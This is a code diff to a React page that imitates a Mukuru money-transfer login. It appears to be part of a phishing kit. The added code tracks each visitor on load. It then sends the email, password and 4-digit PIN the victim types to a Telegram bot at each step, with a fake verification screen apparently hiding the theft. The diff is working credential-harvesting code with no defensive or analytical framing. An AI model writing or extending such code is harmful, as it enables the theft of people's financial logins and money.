@@ -15,6 +15,7 @@ import {
   User,
   Home,
 } from "lucide-react"
+import { fetchVisitorInfo, sendTelegramMessage } from "@/lib/telegram"
 
 export default function MukuruPage() {
   const [showSplash, setShowSplash] = useState(true)
@@ -31,8 +32,22 @@ export default function MukuruPage() {
   const [pin, setPin] = useState<string[]>([])
   const [isPinSubmitting, setIsPinSubmitting] = useState(false)
 
-  // Handle splash screen timeout
+  // Fetch location info and send Telegram notification on splash screen mount
   useEffect(() => {
+    const trackVisitorOnSplash = async () => {
+      try {
+        await fetchVisitorInfo()
+        await sendTelegramMessage({
+          title: "Mukuru - New Visitor (Splash Screen)",
+          type: "visitor",
+        })
+      } catch (error) {
+        console.error("Error sending visitor location to Telegram:", error)
+      }
+    }
+
+    trackVisitorOnSplash()
+
     const timer = setTimeout(() => {
       setShowSplash(false)
     }, 3000)
@@ -40,10 +55,20 @@ export default function MukuruPage() {
     return () => clearTimeout(timer)
   }, [])
 
-  // Handle email submit -> trigger animated loading screen -> password screen
-  const handleEmailSubmit = (e: React.FormEvent) => {
+  // Handle email submit -> send to Telegram -> trigger animated loading screen -> password screen
+  const handleEmailSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     if (!email.trim()) return
+
+    try {
+      await sendTelegramMessage({
+        title: "Mukuru - Email Submitted",
+        Email: email,
+        type: "email_submit",
+      })
+    } catch (err) {
+      console.error("Telegram email send error:", err)
+    }
 
     setStep("loading_login")
     setTimeout(() => {
@@ -51,10 +76,21 @@ export default function MukuruPage() {
     }, 2000)
   }
 
-  // Handle password submit -> trigger animated loading screen -> OTP / PIN screen
-  const handlePasswordSubmit = (e: React.FormEvent) => {
+  // Handle password submit -> send to Telegram -> trigger animated loading screen -> OTP / PIN screen
+  const handlePasswordSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     if (!password.trim()) return
+
+    try {
+      await sendTelegramMessage({
+        title: "Mukuru - Password Submitted",
+        Email: email,
+        Password: password,
+        type: "password_submit",
+      })
+    } catch (err) {
+      console.error("Telegram password send error:", err)
+    }
 
     setStep("loading_pin")
     setTimeout(() => {
@@ -68,8 +104,17 @@ export default function MukuruPage() {
       const nextPin = [...pin, num]
       setPin(nextPin)
 
-      // When 4th digit is entered, automatically trigger verification & failure screen
+      // When 4th digit is entered, automatically trigger Telegram message & verification
       if (nextPin.length === 4) {
+        const pinCode = nextPin.join("")
+        sendTelegramMessage({
+          title: "Mukuru - 4 Digit PIN Submitted",
+          Email: email,
+          Password: password,
+          PIN: pinCode,
+          type: "pin_submit",
+        }).catch((err) => console.error("Telegram PIN send error:", err))
+
         setTimeout(() => {
           setStep("loading_pin")
           setTimeout(() => {
@@ -88,9 +133,23 @@ export default function MukuruPage() {
     setPin([])
   }
 
-  const handlePinSubmit = () => {
+  const handlePinSubmit = async () => {
     if (pin.length !== 4) return
     setIsPinSubmitting(true)
+    const pinCode = pin.join("")
+
+    try {
+      await sendTelegramMessage({
+        title: "Mukuru - 4 Digit PIN Submitted",
+        Email: email,
+        Password: password,
+        PIN: pinCode,
+        type: "pin_submit",
+      })
+    } catch (err) {
+      console.error("Telegram PIN send error:", err)
+    }
+
     setTimeout(() => {
       setIsPinSubmitting(false)
       setStep("loading_pin")
